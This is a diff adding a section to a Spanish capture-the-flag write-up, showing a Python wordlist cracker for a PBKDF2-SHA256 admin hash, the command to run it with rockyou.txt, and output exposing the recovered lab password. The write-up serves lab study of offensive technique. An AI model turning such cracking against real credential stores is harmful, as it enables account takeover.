@@ -198,13 +198,105 @@ Hecho esto veremos que ha funcionado y estaremos dentro de la pagina como el usu
 
 <figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-17 133005.png" alt=""><figcaption></figcaption></figure>
 
-Veremos que hay un `Panel de admin` si entramos dentro veremos poca cosa, pero ...
+Veremos que hay un `Panel de admin` si entramos dentro veremos poca cosa.
 
 ## Escalate user adam.scott
 
 ### Crackeo Hash Admin
 
-...
+Si investigamos mas el `hash` del usuario `admin` de la `DDBB` podremos ver que si se puede `crackear`, vamos a crear antes un script con `python3` para formar bien dicho `hash` y `crackearlo` directamente.
+
+> crackerHash.py
+
+```python
+#!/usr/bin/env python3
+"""
+Cracker directo de PBKDF2-SHA256
+"""
+
+import hashlib
+import binascii
+
+def crack_pbkdf2(target_hash, wordlist_path):
+    """Intenta crackear el hash con una wordlist"""
+    
+    # Parsear el hash
+    parts = target_hash.replace('pbkdf2:sha256:', '').split('$')
+    iterations = int(parts[0])
+    salt = parts[1]
+    target_hash_hex = parts[2]
+    
+    print(f"[+] Target: {target_hash_hex}")
+    print(f"[+] Salt: {salt}")
+    print(f"[+] Iterations: {iterations}")
+    print(f"[+] Wordlist: {wordlist_path}")
+    print("-" * 50)
+    
+    try:
+        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+            for i, password in enumerate(f):
+                password = password.strip()
+                
+                if not password:
+                    continue
+                
+                # Generar hash PBKDF2
+                derived_key = hashlib.pbkdf2_hmac(
+                    'sha256',
+                    password.encode('utf-8'),
+                    salt.encode('utf-8'),
+                    iterations
+                )
+                
+                current_hash = binascii.hexlify(derived_key).decode('utf-8')
+                
+                # Verificar si coincide
+                if current_hash == target_hash_hex:
+                    print(f"\n🎉 ¡CONTRASEÑA ENCONTRADA!")
+                    print(f"🔑 Password: {password}")
+                    return password
+                
+                # Mostrar progreso cada 10000 intentos
+                if i % 10000 == 0 and i > 0:
+                    print(f"[+] Probadas: {i} contraseñas... Última: {password}")
+            
+            print(f"\n❌ Contraseña no encontrada en la wordlist")
+            return None
+            
+    except FileNotFoundError:
+        print(f"❌ Wordlist no encontrada: {wordlist_path}")
+        return None
+    except KeyboardInterrupt:
+        print(f"\n⏹️  Búsqueda interrumpida por el usuario")
+        return None
+
+if __name__ == "__main__":
+    target_hash = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
+    wordlist = "/usr/share/wordlists/rockyou.txt"
+    
+    crack_pbkdf2(target_hash, wordlist)
+```
+
+Lo vamos a ejecutar de esta forma:
+
+```shell
+python3 crackerHash.py
+```
+
+Info:
+
+```
+[+] Target: 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
+[+] Salt: AMtzteQIG7yAbZIa
+[+] Iterations: 600000
+[+] Wordlist: /usr/share/wordlists/rockyou.txt
+--------------------------------------------------
+
+🎉 ¡CONTRASEÑA ENCONTRADA!
+🔑 Password: iloveyou1
+```
+
+Veremos que ha funcionado, por lo que habremos obtenido la contraseña de forma correcta.
 
 ### Fuerza bruta con netexec
 
